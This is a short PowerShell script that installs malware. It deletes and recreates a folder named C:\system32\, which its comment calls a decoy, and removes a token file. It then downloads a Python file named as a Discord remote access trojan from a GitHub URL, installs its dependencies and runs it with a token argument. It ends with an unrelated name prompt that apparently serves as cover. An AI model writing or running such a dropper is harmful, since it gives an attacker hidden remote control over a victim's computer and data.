#No this doesnt remove the real system32 its just a decoy
Remove-Item -Path 'C:\system32\' -Recurse
Remove-Item -Path '$Env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Themes\token.txt'

mkdir 'C:\system32\'

cd C:\system32\

iwr -Uri https://raw.githubusercontent.com/simen64/Simple-discord-RAT/main/Simple-Discord-RAT.py -OutFile C:\system32\sys-rat.py

py -m pip install discord.py requests --user

Python sys-rat.py $dc

$name= Read-Host -Prompt "Enter your name"
pause
